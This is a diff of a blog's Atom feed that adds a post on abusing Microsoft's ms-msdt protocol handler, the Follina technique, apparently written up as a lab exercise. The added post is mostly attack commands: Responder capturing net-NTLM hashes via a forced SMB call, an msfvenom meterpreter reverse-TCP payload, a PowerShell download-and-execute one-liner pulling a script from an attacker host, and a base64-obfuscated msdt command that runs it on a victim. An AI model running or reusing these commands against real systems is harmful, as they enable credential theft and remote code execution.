@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-05-29T07:47:06.282Z</updated>
+  <updated>2022-05-31T10:20:13.195Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Microsoft ms-msdt Abuse</title>
+    <link href="http://example.com/2022/05/31/microsoft-msdt-abuse/"/>
+    <id>http://example.com/2022/05/31/microsoft-msdt-abuse/</id>
+    <published>2022-05-31T10:05:06.000Z</published>
+    <updated>2022-05-31T10:20:13.195Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="catch-net-NTLM-hash"><a href="#catch-net-NTLM-hash" class="headerlink" title="catch net-NTLM hash"></a>catch net-NTLM hash</h1><ol><li>Start Responder listening<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Responder -I eth1</span><br></pre></td></tr></table></figure></li><li>ms-msdt to access remote smb service<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\192.168.56.100\\share\\good)/.exe&quot;</span><br></pre></td></tr></table></figure><img src="/images/msdt-getNTLM.png"></li></ol><h2 id="get-reverse-shell"><a href="#get-reverse-shell" class="headerlink" title="get reverse shell"></a>get reverse shell</h2><ol><li>generate meterpreter powershell<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.100 lport=443 -f psh -o great.ps1</span><br></pre></td></tr></table></figure></li><li>powershell onliner to execute reverse shell<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).downloadstring(&#x27;http://192.168.56.100:8000/meter.ps1&#x27;)</span><br></pre></td></tr></table></figure></li><li>base64 encoding for space respecting<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command = <span class="string">f&quot;IEX(New-Object Net.WebClient).downloadstring(&#x27;http://192.168.56.100:8000/meter.ps1&#x27;)&quot;</span></span><br><span class="line">base64_payload = base64.b64encode(command.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure></li><li>on victim server<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression(&#x27;[System.Text.Encoding]&#x27;+[char]58+[char]58+&#x27;UTF8.GetString([System.Convert]&#x27;+[char]58+[char]58+&#x27;FromBase64String(&#x27;+[char]34+&#x27;SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwMDo4MDAwL2dyZWF0LnBzMScp&#x27;+[char]34+&#x27;))&#x27;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO&quot;</span><br></pre></td></tr></table></figure><img src="/images/msdt-rs.png"></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;catch-net-NTLM-hash&quot;&gt;&lt;a href=&quot;#catch-net-NTLM-hash&quot; class=&quot;headerlink&quot; title=&quot;catch net-NTLM hash&quot;&gt;&lt;/a&gt;catch net-NTLM hash&lt;/h1&gt;&lt;ol&gt;
+</summary>
+      
+    
+    
+    
+    <category term="windows" scheme="http://example.com/categories/windows/"/>
+    
+    
+    <category term="windows" scheme="http://example.com/tags/windows/"/>
+    
+    <category term="lolbas" scheme="http://example.com/tags/lolbas/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2022-26923 ADCS Priv Sc</title>
